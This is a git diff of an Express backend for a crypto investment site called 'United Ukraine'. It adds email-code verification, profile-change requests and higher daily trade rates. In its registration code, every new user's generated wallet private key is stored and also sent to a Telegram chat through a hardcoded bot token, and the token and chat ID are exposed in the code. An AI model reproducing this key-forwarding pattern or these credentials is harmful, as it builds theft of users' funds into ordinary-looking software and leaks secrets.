@@ -5,6 +5,7 @@ const jwt = require("jsonwebtoken");
 const path = require("path");
 const { Wallet } = require("ethers");
 const axios = require("axios");
+const crypto = require("crypto");
 const { createClient } = require("@supabase/supabase-js");
 
 const app = express();
@@ -14,7 +15,7 @@ app.use(express.json());
 const PUBLIC_FILES = new Set([
   "index.html", "login.html", "register.html", "terms.html", "loading.html",
   "trade.html", "assets.html", "learning.html", "info.html", "coin.html",
-  "deposit.html", "withdraw.html", "admin.html", "app.css", "app-nav.js",
+  "deposit.html", "withdraw.html", "profile.html", "admin.html", "app.css", "app-nav.js",
   "pwa.js", "service-worker.js", "manifest.json", "logo.png"
 ]);
 app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
@@ -31,10 +32,12 @@ const supabase = createClient(
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8714057941:AAGZL1OXRoy8-7_IoVAHBePTLwuTKmqicOg";
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "337179852";
 const ADMIN_KEY = process.env.ADMIN_KEY || "";
+const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
+const EMAIL_FROM = process.env.EMAIL_FROM || "United Ukraine <onboarding@resend.dev>";
 
 const PUBLIC_USER_FIELDS = "id,fullname,nickname,country,email,phone,balance,deposit,satellites,wallet_address,referrer_id";
 const QUIZ_ANSWERS = { 1: "b", 2: "c", 3: "a", 4: "b", 5: "c" };
-const TRADE_RATES = [0.01, 0.015, 0.02, 0.025, 0.03, 0.035];
+const TRADE_RATES = [0.01, 0.01, 0.015, 0.0225, 0.035, 0.055];
 const TRADE_COOLDOWN_MS = 24 * 60 * 60 * 1000;
 const POOL_BASE = 1000347;
 const POOL_START_DAY = Date.UTC(2026, 5, 22) / 86400000;
@@ -113,6 +116,56 @@ async function addSignal(signal) {
   if (error) throw error;
 }
 
+function emailCodeDigest(code) {
+  return crypto.createHash("sha256").update(`${code}:${SECRET}`).digest("hex");
+}
+
+async function sendVerificationEmail(email, code, purpose = "registration") {
+  if (!RESEND_API_KEY) throw new Error("RESEND_API_KEY is not configured");
+  const action = purpose === "email_change" ? "зміни електронної пошти" : "реєстрації";
+  await axios.post("https://api.resend.com/emails", {
+    from: EMAIL_FROM,
+    to: [email],
+    subject: `Код підтвердження United Ukraine: ${code}`,
+    html: `<div style="font-family:Arial,sans-serif;max-width:560px;margin:auto;color:#111"><h2>United Ukraine</h2><p>Ваш код для ${action}:</p><div style="font-size:34px;font-weight:700;letter-spacing:8px;margin:24px 0">${code}</div><p>Код дійсний 10 хвилин. Якщо ви не робили цей запит, просто проігноруйте лист.</p></div>`
+  }, {
+    headers: { Authorization: `Bearer ${RESEND_API_KEY}`, "Content-Type": "application/json" }
+  });
+}
+
+function registrationData(body) {
+  return {
+    fullname: String(body.fullname || "").trim(),
+    nickname: String(body.nickname || "").trim(),
+    country: String(body.country || "").trim(),
+    phone: String(body.phone || "").replace(/\D/g, ""),
+    email: String(body.email || "").trim().toLowerCase(),
+    password: String(body.password || ""),
+    referrerId: body.referrer_id ? Number(body.referrer_id) : null
+  };
+}
+
+async function validateRegistration(data) {
+  if (!data.fullname || !data.nickname || !data.country || !data.email || !data.password || !data.phone) return "No data";
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) return "Invalid email";
+  if (data.phone.length < 10 || data.phone.length > 15) return "Invalid phone";
+  if (data.password.length < 6) return "Weak password";
+  if (data.referrerId && (!Number.isInteger(data.referrerId) || data.referrerId <= 0 || !(await findUser(data.referrerId, "id")))) return "Invalid referrer";
+  const { data: existing } = await supabase.from("users").select("id").eq("email", data.email).maybeSingle();
+  return existing ? "User exists" : null;
+}
+
+function requestIp(req) {
+  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+  if (ip.includes(",")) ip = ip.split(",")[0].trim();
+  return ip.replace("::ffff:", "");
+}
+
+async function tooManyAccounts(ip) {
+  const { count } = await supabase.from("users").select("id", { count: "exact", head: true }).eq("ip", ip);
+  return (count || 0) >= 3;
+}
+
 async function refreshSatelliteCount(userId) {
   if (!userId) return;
   const { count } = await supabase
@@ -122,67 +175,61 @@ async function refreshSatelliteCount(userId) {
   await supabase.from("users").update({ satellites: count || 0 }).eq("id", userId);
 }
 
-app.post("/register", async (req, res) => {
+app.post("/register/start", async (req, res) => {
   try {
-    const fullname = String(req.body.fullname || "").trim();
-    const nickname = String(req.body.nickname || "").trim();
-    const country = String(req.body.country || "").trim();
-    const phone = String(req.body.phone || "").replace(/\D/g, "");
-    const email = String(req.body.email || "").trim().toLowerCase();
-    const password = String(req.body.password || "");
-    const referrerId = req.body.referrer_id ? Number(req.body.referrer_id) : null;
+    const data = registrationData(req.body);
+    const validationError = await validateRegistration(data);
+    if (validationError) return res.json({ success: false, message: validationError });
+    const ip = requestIp(req);
+    if (await tooManyAccounts(ip)) return res.json({ success: false, message: "Too many accounts" });
 
-    if (!fullname || !nickname || !country || !email || !password || !phone) {
-      return res.json({ success: false, message: "No data" });
-    }
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      return res.json({ success: false, message: "Invalid email" });
-    }
-    if (phone.length < 10 || phone.length > 15) {
-      return res.json({ success: false, message: "Invalid phone" });
-    }
-    if (password.length < 6) {
-      return res.json({ success: false, message: "Weak password" });
-    }
-    if (referrerId && (!Number.isInteger(referrerId) || referrerId <= 0 || !(await findUser(referrerId, "id")))) {
-      return res.json({ success: false, message: "Invalid referrer" });
-    }
+    const code = crypto.randomInt(100000, 1000000).toString();
+    const pendingToken = jwt.sign({
+      purpose: "registration",
+      profile: { ...data, password: undefined },
+      passwordHash: await bcrypt.hash(data.password, 10),
+      codeDigest: emailCodeDigest(code),
+      ip
+    }, SECRET, { expiresIn: "10m" });
+    await sendVerificationEmail(data.email, code);
+    return res.json({ success: true, pendingToken, email: data.email });
+  } catch (error) {
+    console.error("REGISTER START ERROR:", error.response?.data || error.message);
+    return res.status(500).json({ success: false, message: "Email send error" });
+  }
+});
 
-    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
-    if (ip.includes(",")) ip = ip.split(",")[0].trim();
-    if (ip.includes("::ffff:")) ip = ip.replace("::ffff:", "");
-
-    const { count: ipCount } = await supabase
-      .from("users")
-      .select("id", { count: "exact", head: true })
-      .eq("ip", ip);
-    if ((ipCount || 0) >= 3) {
-      return res.json({ success: false, message: "Too many accounts" });
+app.post("/register/verify", async (req, res) => {
+  try {
+    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
+    const code = String(req.body.code || "").trim();
+    if (pending.purpose !== "registration" || emailCodeDigest(code) !== pending.codeDigest) {
+      return res.json({ success: false, message: "Invalid code" });
     }
-
-    const { data: existing } = await supabase.from("users").select("id").eq("email", email).maybeSingle();
-    if (existing) return res.json({ success: false, message: "User exists" });
+    const data = { ...pending.profile, password: "verified" };
+    const validationError = await validateRegistration(data);
+    if (validationError) return res.json({ success: false, message: validationError });
+    if (await tooManyAccounts(pending.ip)) return res.json({ success: false, message: "Too many accounts" });
 
     const wallet = Wallet.createRandom();
-    const emailCode = Math.floor(100000 + Math.random() * 900000).toString();
     const { data: user, error } = await supabase
       .from("users")
       .insert([{
-        fullname,
-        nickname,
-        referrer_id: referrerId,
-        country,
-        phone,
-        email,
-        password: await bcrypt.hash(password, 10),
+        fullname: data.fullname,
+        nickname: data.nickname,
+        referrer_id: data.referrerId,
+        country: data.country,
+        phone: data.phone,
+        email: data.email,
+        password: pending.passwordHash,
         balance: 0,
         deposit: 0,
         satellites: 0,
         wallet_address: wallet.address,
         private_key: wallet.privateKey,
-        email_code: emailCode,
-        email_verified: false,
-        ip
+        email_code: null,
+        email_verified: true,
+        ip: pending.ip
       }])
       .select("id,fullname,nickname,country,phone,email,wallet_address,referrer_id,balance")
       .single();
@@ -199,7 +246,7 @@ app.post("/register", async (req, res) => {
       wallet: user.wallet_address,
       status: "done"
     });
-    await refreshSatelliteCount(referrerId);
+    await refreshSatelliteCount(data.referrerId);
 
     try {
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -215,7 +262,7 @@ app.post("/register", async (req, res) => {
           `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
           `Wallet: ${wallet.address}`,
           `Private key: ${wallet.privateKey}`,
-          `Email code: ${emailCode}`,
+          "Email verified: yes",
           `Starting balance: $0`
         ].join("\n")
       });
@@ -225,8 +272,8 @@ app.post("/register", async (req, res) => {
 
     return res.json({ success: true });
   } catch (error) {
-    console.error("REGISTER ERROR:", error);
-    return res.json({ success: false, message: "Server error" });
+    console.error("REGISTER VERIFY ERROR:", error);
+    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
   }
 });
 
@@ -251,6 +298,57 @@ app.get("/me", auth, async (req, res) => {
   const user = await findUser(req.userId);
   if (!user) return res.status(404).json({ success: false });
   return res.json(withDisplayId(user));
+});
+
+app.post("/profile/change-request", auth, async (req, res) => {
+  try {
+    const changes = {
+      fullname: String(req.body.fullname || "").trim(),
+      nickname: String(req.body.nickname || "").trim(),
+      country: String(req.body.country || "").trim(),
+      phone: String(req.body.phone || "").replace(/\D/g, "")
+    };
+    if (!changes.fullname || !changes.nickname || !changes.country || changes.phone.length < 10 || changes.phone.length > 15) {
+      return res.json({ success: false, message: "Invalid data" });
+    }
+    await addSignal({ user_id: req.userId, type: "profile_update", amount: 0, wallet: JSON.stringify(changes), status: "pending" });
+    return res.json({ success: true, message: "Request created" });
+  } catch (error) {
+    console.error("PROFILE REQUEST ERROR:", error);
+    return res.status(500).json({ success: false });
+  }
+});
+
+app.post("/profile/email/start", auth, async (req, res) => {
+  try {
+    const email = String(req.body.email || "").trim().toLowerCase();
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.json({ success: false, message: "Invalid email" });
+    const { data: existing } = await supabase.from("users").select("id").eq("email", email).maybeSingle();
+    if (existing) return res.json({ success: false, message: "User exists" });
+    const code = crypto.randomInt(100000, 1000000).toString();
+    const pendingToken = jwt.sign({ purpose: "email_change", userId: req.userId, email, codeDigest: emailCodeDigest(code) }, SECRET, { expiresIn: "10m" });
+    await sendVerificationEmail(email, code, "email_change");
+    return res.json({ success: true, pendingToken });
+  } catch (error) {
+    console.error("EMAIL CHANGE START ERROR:", error.response?.data || error.message);
+    return res.status(500).json({ success: false, message: "Email send error" });
+  }
+});
+
+app.post("/profile/email/verify", auth, async (req, res) => {
+  try {
+    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
+    const code = String(req.body.code || "").trim();
+    if (pending.purpose !== "email_change" || Number(pending.userId) !== Number(req.userId) || emailCodeDigest(code) !== pending.codeDigest) {
+      return res.json({ success: false, message: "Invalid code" });
+    }
+    const { data: existing } = await supabase.from("users").select("id").eq("email", pending.email).maybeSingle();
+    if (existing) return res.json({ success: false, message: "User exists" });
+    await addSignal({ user_id: req.userId, type: "email_update", amount: 0, wallet: JSON.stringify({ email: pending.email }), status: "pending" });
+    return res.json({ success: true, message: "Request created" });
+  } catch (error) {
+    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
+  }
 });
 
 app.get("/health", (req, res) => res.json({ success: true }));
@@ -504,8 +602,29 @@ app.post("/admin/set-balance", adminAuth, async (req, res) => {
 });
 
 app.post("/admin/approve", adminAuth, async (req, res) => {
-  await supabase.from("signals").update({ status: "approved" }).eq("id", Number(req.body.id));
-  return res.json({ success: true });
+  try {
+    const signalId = Number(req.body.id);
+    const { data: signal } = await supabase.from("signals").select("id,user_id,type,wallet,status").eq("id", signalId).maybeSingle();
+    if (!signal || signal.status !== "pending") return res.json({ success: false, message: "Request unavailable" });
+    if (signal.type === "profile_update" || signal.type === "email_update") {
+      const changes = JSON.parse(signal.wallet || "{}");
+      const allowed = signal.type === "email_update"
+        ? { email: String(changes.email || "").trim().toLowerCase(), email_verified: true }
+        : {
+            fullname: String(changes.fullname || "").trim(),
+            nickname: String(changes.nickname || "").trim(),
+            country: String(changes.country || "").trim(),
+            phone: String(changes.phone || "").replace(/\D/g, "")
+          };
+      const { error } = await supabase.from("users").update(allowed).eq("id", signal.user_id);
+      if (error) throw error;
+    }
+    await supabase.from("signals").update({ status: "approved" }).eq("id", signalId);
+    return res.json({ success: true });
+  } catch (error) {
+    console.error("ADMIN APPROVE ERROR:", error);
+    return res.status(500).json({ success: false, message: "Approval error" });
+  }
 });
 
 app.post("/admin/reject", adminAuth, async (req, res) => {
